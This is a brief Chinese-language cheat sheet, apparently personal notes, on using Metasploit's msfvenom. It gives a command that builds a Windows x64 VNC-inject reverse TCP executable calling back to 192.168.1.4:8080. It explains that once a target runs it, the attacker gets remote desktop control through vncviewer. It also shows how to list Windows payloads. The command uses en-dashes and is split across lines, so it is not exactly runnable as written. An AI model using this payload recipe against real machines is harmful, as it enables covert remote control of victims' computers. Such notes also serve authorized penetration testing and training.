# 远程控制

选择windows/x64/vncinject/reverse_tcp，设置AUTOVNC为false，run之后，再开启vncviewer

配置如下
```
msfvenom –p windows/x64/vncinject/reverse_tcp
AUTOVNC=false
LHOST=192.168.1.4
LPORT=8080
–f exe
–o 192.168.1.4-8080.exe
run
```
目标主机执行payload后，监听器需成功接收反连，然后打开vncviewer，访问127.0.0.1:5900

# 检索包含windows的Payload

经测试发现，每行开头有4个空格

```
msfvenom -l payloads | grep "^   windows"
```

